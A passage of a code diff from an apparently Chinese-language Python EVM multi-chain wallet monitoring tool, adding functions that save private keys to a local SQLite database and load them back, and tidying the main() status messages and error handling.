+                        ('private_keys', joined_keys)
+                    )
+                    await db.commit()
+                    print_success("私钥已保存到数据库")
+        except Exception as e:
+            print_warning(f"私钥数据库保存失败: {e}")
+    
+    async def load_private_keys_from_db(self):
+        """从数据库加载私钥"""
+        try:
+            async with self.db_manager._lock:
+                async with aiosqlite.connect(self.db_manager.db_path) as db:
+                    cursor = await db.execute(
+                        "SELECT value FROM config WHERE key = 'private_keys'"
+                    )
+                    result = await cursor.fetchone()
+                    if result:
+                        private_keys_str = result[0]
+                        private_keys = private_keys_str.split(',')
+                        
+                        self.addresses = []
+                        for private_key in private_keys:
+                            try:
+                                account = Account.from_key(private_key.strip())
+                                self.addresses.append({
+                                    'address': account.address,
+                                    'private_key': private_key.strip()
+                                })
+                            except Exception as e:
+                                logging.error(f"加载私钥失败: {e}")
+                        
+                        if self.addresses:
+                            print_success(f"从数据库加载了 {len(self.addresses)} 个地址")
+                            return True
+        except Exception as e:
+            print_warning(f"从数据库加载私钥失败: {e}")
+        
+        return False
     
 async def main():
     """主函数"""
-    print("🚀 正在初始化EVM多链监控工具...")
+    print_progress("正在初始化EVM多链监控工具...")
     
     app = MonitoringApp()
     
     try:
         await app.initialize()
-        print("✅ 初始化完成！")
         
         # 显示状态信息
-        print(f"📊 支持 {len(ChainConfig.SUPPORTED_CHAINS)} 条区块链")
+        print_info(f"支持 {len(ChainConfig.SUPPORTED_CHAINS)} 条区块链")
         if app.addresses:
-            print(f"📝 已加载 {len(app.addresses)} 个监控地址")
+            print_success(f"已加载 {len(app.addresses)} 个监控地址")
         else:
-            print("📝 未加载监控地址，请先导入私钥")
+            print_warning("未加载监控地址，请先导入私钥")
         
         # 进入交互式菜单
         await app.show_interactive_menu()
         
+    except KeyboardInterrupt:
+        print_warning("\n程序被用户中断，正在退出...")
     except Exception as e:
-        print(f"❌ 初始化失败: {e}")
-        logging.error(f"初始化失败: {e}")
+        print_error(f"程序运行出错: {e}")
+        logging.error(f"程序运行出错: {e}")
         return 1
+    finally:
+        print_info("程序已退出")
     
     return 0
 
